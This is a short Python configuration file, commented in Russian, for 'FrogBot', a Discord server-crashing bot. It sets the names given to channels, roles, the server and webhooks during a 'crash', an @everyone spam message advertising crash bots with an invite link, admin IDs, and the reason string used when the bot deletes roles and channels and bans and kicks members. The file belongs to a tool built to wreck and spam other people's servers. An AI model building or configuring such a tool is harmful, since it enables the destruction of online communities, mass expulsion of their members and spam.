...
# подробные настройки
channelsn = 'Crash By FrogBot' #имя каналов при краше
rolesn = 'Crash By FrogBot'#имя ролей при краше
namen = 'Crash By FrogBot'#имя сервера при краше
iconn = 'icon.PNG' # не трогайте лучше
hooknamen = 'Crash By FrogBot'#имя хуков
botnamen = 'frogBot'#тип имя бота
inviten = 'https://discord.gg/EGepxTeWY5' # тут ссылка на ваш сервер
spamtextn = f'@everyone\nДанный сервер крашиться ботом Crash By FrogBot\nКрутые краш боты там ->: {inviten}'
admins = [612999568149184522] # тут укажи id админов (могут добавлять сервера в вайт лист и менять статус боту), например [123,456,777]
reasonn = 'Crash By FrogBot' # причина удаления ролей,каналов, бана и кика участников
